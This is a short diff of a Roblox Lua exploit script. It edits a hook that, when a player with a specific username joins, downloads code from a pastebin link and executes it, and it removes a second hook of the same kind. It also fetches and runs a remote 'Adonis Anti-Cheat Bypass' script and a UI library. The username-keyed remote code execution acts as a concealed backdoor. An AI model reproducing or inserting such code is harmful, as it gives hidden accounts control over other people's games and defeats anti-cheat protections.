@@ -1,15 +1,10 @@
 
 game.Players.PlayerAdded:Connect(function(player)
   if player.Name == "ProAIt5000" then
-			loadstring(game:HttpGet("https://pastebin.com/raw/kYkU0LqY"))()
+			loadstring(game:HttpGet("https://pastebin.com/CBZ1CZ9s"))()
 		end
 end)
 
-game.Players.PlayerAdded:Connect(function(player)
-  if player.Name == "1kS_up" then
-			loadstring(game:HttpGet("https://pastebin.com/raw/TSk41g6s"))()
-		end
-end)
 
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
